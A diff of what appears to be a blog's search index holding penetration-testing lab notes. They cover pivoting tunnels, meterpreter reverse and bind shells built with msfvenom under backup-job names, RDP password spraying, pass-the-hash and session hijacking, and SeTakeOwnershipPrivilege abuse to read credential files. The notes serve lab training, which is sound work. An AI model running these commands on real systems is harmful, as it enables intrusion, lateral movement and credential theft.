-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT &lt;listener-Port-on-n&gt; </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 0.0.0.0 </span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
-
-<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n+1 → n )"></a>Creating the Reverse Port Forwarding Tunnel ( n+1 → n )</h3><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -R Internal-IP-of-PivotHost-n+1:&lt;Internal-listener-Port-on-n+1&gt;:0.0.0.0:&lt;listener-Port-on-n&gt; username@n+1 -vN</span><br></pre></td></tr></table></figure>
-
-<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -R -l &lt;listener-Port-on-n&gt; -p &lt;Internal-listener-Port-on-n+1&gt; -L IP-of-n-machine</span><br></pre></td></tr></table></figure>
-
-<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:&lt;Internal-listener-Port-on-n+1&gt;,fork TCP4:IP-of-n-machine:&lt;listener-Port-on-n&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Execute-Reverse-Shell"><a href="#Execute-Reverse-Shell" class="headerlink" title="Execute Reverse Shell"></a>Execute Reverse Shell</h3><p>Once you execute <code>backupscript.exe</code> on Windows (n+2), we receive a shell from Windows pivoted via the Ubuntu server :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2336 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1637]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><h3 id="Bind-Shell-Preparation-Payload-Bind-Setup"><a href="#Bind-Shell-Preparation-Payload-Bind-Setup" class="headerlink" title="Bind Shell Preparation (Payload + Bind Setup)"></a>Bind Shell Preparation (Payload + Bind Setup)</h3><p>Create Bind Shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
-
-
-<p> Configuring &amp; Starting multi&#x2F;handler</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT Bind-port-on-n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
-
-<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n → n+1 )"></a>Creating the Reverse Port Forwarding Tunnel ( n → n+1 )</h3><h6 id="Socat-1"><a href="#Socat-1" class="headerlink" title="Socat"></a>Socat</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:Bind-port-on-n+1,fork TCP4:n+2-machine:Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Execute-Bind-Shell"><a href="#Execute-Bind-Shell" class="headerlink" title="Execute Bind Shell"></a>Execute Bind Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: INLANEFREIGHT\victor</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Pivoting And Port Forwarding</category>
-      </categories>
-      <tags>
-        <tag>Local-Port-Forwarding</tag>
-        <tag>Dynamic-Port-Forwarding</tag>
-        <tag>Proxychains</tag>
-        <tag>Rpivot</tag>
-        <tag>sshuttle</tag>
-        <tag>plink</tag>
-        <tag>Proxifier</tag>
-        <tag>socat</tag>
-        <tag>Reverse-Port-Forwarding</tag>
-        <tag>Chisel</tag>
       </tags>
   </entry>
   <entry>
@@ -3258,6 +3101,49 @@
       </tags>
   </entry>
   <entry>
+    <title>RDP Exploitation</title>
+    <url>/2025/12/04/RDP-Exploitation/</url>
+    <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
+
+<h4 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crowbar -b rdp -s ip/32 -U usernames.txt -c &#x27;Pwd&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Pass-The-Hash-ptt"><a href="#Pass-The-Hash-ptt" class="headerlink" title="Pass The Hash ( ptt )"></a>Pass The Hash ( ptt )</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Sometimes we may be blocked because Restricted Admin Mode is disabled by default, so we can enable it using PowerShell and then try PtH again:</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RDP-Session-Hijacking"><a href="#RDP-Session-Hijacking" class="headerlink" title="RDP Session Hijacking"></a>RDP Session Hijacking</h1><blockquote>
+<p>If we get <code>SYSTEM privileges</code> on the target machine, we can hijack an active RDP session, potentially taking over a Domain Admin account.</p>
+</blockquote>
+<p>List active RDP sessions</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; query user</span><br><span class="line"></span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;twistzz               rdp<span class="literal">-tcp</span><span class="comment">#13          1  Active          7  8/25/2021 1:23 AM</span></span><br><span class="line"> test                  rdp<span class="literal">-tcp</span><span class="comment">#14          2  Active          *  8/25/2021 1:28 AM</span></span><br></pre></td></tr></table></figure>
+
+<p>Creating a new service with <code>sc.exe</code> and attaching ourselves to another user session using <code>tscon</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; sc.exe create service<span class="literal">-name</span> binpath= <span class="string">&quot;cmd.exe /k tscon TARGET_SESSION_ID /dest: OUR_SESSION_NAME &quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
+
+<p>Start the service to hijack the session</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net <span class="built_in">start</span> service<span class="literal">-name</span></span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>RDP</category>
+      </categories>
+      <tags>
+        <tag>RDP</tag>
+        <tag>RDP-Session-Hijacking</tag>
+        <tag>Crowbar</tag>
+        <tag>Hydra</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Scheduled Tasks</title>
     <url>/2026/06/26/Scheduled-Tasks/</url>
     <content><![CDATA[<blockquote>
@@ -3392,49 +3278,6 @@
       </categories>
   </entry>
   <entry>
-    <title>RDP Exploitation</title>
-    <url>/2025/12/04/RDP-Exploitation/</url>
-    <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
-
-<h4 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crowbar -b rdp -s ip/32 -U usernames.txt -c &#x27;Pwd&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Pass-The-Hash-ptt"><a href="#Pass-The-Hash-ptt" class="headerlink" title="Pass The Hash ( ptt )"></a>Pass The Hash ( ptt )</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>Sometimes we may be blocked because Restricted Admin Mode is disabled by default, so we can enable it using PowerShell and then try PtH again:</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="RDP-Session-Hijacking"><a href="#RDP-Session-Hijacking" class="headerlink" title="RDP Session Hijacking"></a>RDP Session Hijacking</h1><blockquote>
-<p>If we get <code>SYSTEM privileges</code> on the target machine, we can hijack an active RDP session, potentially taking over a Domain Admin account.</p>
-</blockquote>
-<p>List active RDP sessions</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; query user</span><br><span class="line"></span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;twistzz               rdp<span class="literal">-tcp</span><span class="comment">#13          1  Active          7  8/25/2021 1:23 AM</span></span><br><span class="line"> test                  rdp<span class="literal">-tcp</span><span class="comment">#14          2  Active          *  8/25/2021 1:28 AM</span></span><br></pre></td></tr></table></figure>
-
-<p>Creating a new service with <code>sc.exe</code> and attaching ourselves to another user session using <code>tscon</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; sc.exe create service<span class="literal">-name</span> binpath= <span class="string">&quot;cmd.exe /k tscon TARGET_SESSION_ID /dest: OUR_SESSION_NAME &quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
-
-<p>Start the service to hijack the session</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net <span class="built_in">start</span> service<span class="literal">-name</span></span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>RDP</category>
-      </categories>
-      <tags>
-        <tag>RDP</tag>
-        <tag>RDP-Session-Hijacking</tag>
-        <tag>Crowbar</tag>
-        <tag>Hydra</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SeImpersonate and SeAssignPrimaryToken</title>
     <url>/2026/03/06/SeImpersonate-and-SeAssignPrimaryToken/</url>
     <content><![CDATA[<blockquote>
@@ -3459,6 +3302,67 @@
 
 <h2 id="Catching-SYSTEM-Shell"><a href="#Catching-SYSTEM-Shell" class="headerlink" title="Catching SYSTEM Shell"></a>Catching SYSTEM Shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  windows-privsc rlwrap nc -lvnp 8443</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>User</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SeTakeOwnershipPrivilege</title>
+    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
+</blockquote>
+<ul>
+<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
+</ul>
+<blockquote>
+<p>➜ This can lead us to : </p>
+</blockquote>
+<ol>
+<li><p>Read protected files  </p>
+<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
+</li>
+<li><p>Privilege escalation &#x2F; RCE  </p>
+<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
+</li>
+<li><p>Denial of Service (DoS) </p>
+<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
+</li>
+<li><p>GPO → ownership abuse (domain)</p>
+<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
+</li>
+</ol>
+<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
+</blockquote>
+<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
+<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Now we can () modify, read, etc ) the file.</p>
+</blockquote>
+<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
@@ -3583,65 +3487,281 @@
       </tags>
   </entry>
   <entry>
-    <title>SeTakeOwnershipPrivilege</title>
-    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
+    <title>Pivoting And Port Forwarding</title>
+    <url>/2025/11/22/Pivoting-And-Port-Forwarding/</url>
+    <content><![CDATA[<p>n &#x3D; Our Attacker Machine</p>
+<p>n+1 &#x3D; Pivot Machine</p>
+<p>n+2 &#x3D; Internal Machine</p>
+<h1 id="Local-Port-Forwarding"><a href="#Local-Port-Forwarding" class="headerlink" title="Local Port Forwarding"></a>Local Port Forwarding</h1><h2 id="SSH-n"><a href="#SSH-n" class="headerlink" title="SSH (n)"></a>SSH (n)</h2><p>Forward a Single Port</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L local_port:localhost:remote_port username@n+1</span><br></pre></td></tr></table></figure>
+
+<p>Forward Multiple Ports (n)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L local_port:localhost:remote_port -L local_port:localhost:remote_port username@n+1</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="meterpreter-n"><a href="#meterpreter-n" class="headerlink" title="meterpreter (n)"></a>meterpreter (n)</h3><p>➜ Requires an active Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l Local-proxy-port -p remote-port -r n+2</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:localhost:Local-proxy-port /u:username /p:password</span><br></pre></td></tr></table></figure>
+
+<h3 id="ptunnel-ng"><a href="#ptunnel-ng" class="headerlink" title="ptunnel-ng"></a>ptunnel-ng</h3><h5 id="Server-Side-n-1"><a href="#Server-Side-n-1" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r &lt;target-ip (n+1 or n+2)&gt; -R &lt;target-port&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Client-Side-n"><a href="#Client-Side-n" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -p &lt;pivot-ip (n+1)&gt; -l &lt;local-proxy-port&gt; -r &lt;target-ip&gt; -R &lt;target-port&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>➜ If we forward SSH, we can then use it for dynamic port forwarding.</p>
+<h5 id="Example-Port-forward-SSH"><a href="#Example-Port-forward-SSH" class="headerlink" title="Example : Port forward SSH"></a>Example : Port forward SSH</h5><h6 id="Server-Side-n-1-1"><a href="#Server-Side-n-1-1" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r10.129.202.64 -R22</span><br></pre></td></tr></table></figure>
+
+<h6 id="Client-Side-n-1"><a href="#Client-Side-n-1" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</span><br></pre></td></tr></table></figure>
+
+<h6 id="Connect-to-the-target-port"><a href="#Connect-to-the-target-port" class="headerlink" title="Connect to the target port"></a>Connect to the target port</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p2222 -lubuntu 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>Dynamic Port Forwarding over SSH</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h5 id="Example-Port-forward-RDP"><a href="#Example-Port-forward-RDP" class="headerlink" title="Example : Port forward RDP"></a>Example : Port forward RDP</h5><h6 id="Client-Side-n-2"><a href="#Client-Side-n-2" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./src/ptunnel-ng -p10.129.202.64 -l 2222 -r172.16.5.19 -R3389</span><br></pre></td></tr></table></figure>
+<h6 id="Server-Side-n-1-2"><a href="#Server-Side-n-1-2" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r172.16.5.19 -R3389</span><br></pre></td></tr></table></figure>
+<h6 id="Connect-RDP"><a href="#Connect-RDP" class="headerlink" title="Connect RDP"></a>Connect RDP</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:localhost:2222 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Netsh-n-1"><a href="#Netsh-n-1" class="headerlink" title="Netsh (n+1)"></a>Netsh (n+1)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">netsh.exe</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=<span class="title">Listener</span>-<span class="title">port</span>-<span class="title">on</span>-<span class="title">n</span>+1 <span class="title">listenaddress</span>=<span class="title">n</span>+1 <span class="title">connectport</span>=<span class="title">remote</span>-<span class="title">port</span>-<span class="title">on</span>-<span class="title">n</span>+2 <span class="title">connectaddress</span>=<span class="title">n</span>+2</span></span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=8080 <span class="title">listenaddress</span>=10.129.42.198 <span class="title">connectport</span>=3389 <span class="title">connectaddress</span>=172.16.5.19</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netsh.exe</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">show</span> <span class="title">v4tov4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Listen</span> <span class="title">on</span> <span class="title">ipv4</span>:             <span class="title">Connect</span> <span class="title">to</span> <span class="title">ipv4</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Address</span>         <span class="title">Port</span>        <span class="title">Address</span>         <span class="title">Port</span></span></span><br><span class="line"><span class="function">--------------- ----------  --------------- ----------</span></span><br><span class="line"><span class="function">10.129.42.198   8080        172.16.5.19     3389</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.129.42.198:8080 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="Dynamic-Port-Forwarding"><a href="#Dynamic-Port-Forwarding" class="headerlink" title="Dynamic Port Forwarding"></a>Dynamic Port Forwarding</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Using-Proxychains"><a href="#Using-Proxychains" class="headerlink" title="Using Proxychains"></a>Using Proxychains</h3><h4 id="SSH-n-1"><a href="#SSH-n-1" class="headerlink" title="SSH (n)"></a>SSH (n)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -D Local-proxy-port username@n+1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Meterpreter-n"><a href="#Meterpreter-n" class="headerlink" title="Meterpreter (n)"></a>Meterpreter (n)</h4><p><strong>➜ Requires an active Meterpreter session</strong></p>
+<h5 id="Start-the-SOCKS-Proxy"><a href="#Start-the-SOCKS-Proxy" class="headerlink" title="Start the SOCKS Proxy"></a>Start the SOCKS Proxy</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/server/socks_proxy </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVPORT Local-proxy-port </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVHOST 0.0.0.0 </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> version 4a </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h5 id="Add-Route-to-internal-network"><a href="#Add-Route-to-internal-network" class="headerlink" title="Add Route to internal_network"></a>Add Route to internal_network</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use post/multi/manage/autoroute </span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SESSION &lt;<span class="built_in">id</span>&gt; </span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SUBNET internal_network_@ </span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; run</span><br></pre></td></tr></table></figure>
+
+<pre><code>or 
+</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s internal_network_@/mask</span><br></pre></td></tr></table></figure>
+
+<h4 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h4><h5 id="Server-attacker-machine-n"><a href="#Server-attacker-machine-n" class="headerlink" title="Server (attacker machine - n)"></a>Server (attacker machine - n)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 server.py --proxy-port Local-proxy-port --server-port Listener-port --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>
+
